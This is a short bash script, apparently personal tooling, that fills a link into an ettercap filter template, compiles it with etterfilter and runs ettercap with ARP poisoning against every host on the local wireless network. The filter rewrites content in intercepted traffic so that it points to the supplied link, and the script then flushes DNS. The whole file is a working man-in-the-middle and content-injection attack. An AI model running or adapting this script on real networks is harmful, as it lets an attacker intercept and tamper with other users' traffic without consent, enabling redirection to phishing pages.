#!/bin/bash
#ip=$(sudo ifconfig | grep "inet addr:" | cut -d':' -f2 | cut -d' ' -f1 | grep -v "127.0.0.1")
link=`cat link.txt`
if [[ -n $1 ]]; then link="$1"; fi
link_seded=$(echo "$link" | sed 's/\//\\\//g' | sed 's/\./\\\./g')
echo "$link_seded"
cat replace.filter.dummy | sed "s/LINK/$link_seded/g" > replace.filter
etterfilter replace.filter -o replace.ef
sleep 1
sudo ettercap -T -q -i wlp2s0 -F replace.ef -M arp /// ///
/home/eddy/programming/bash/flushdns.sh
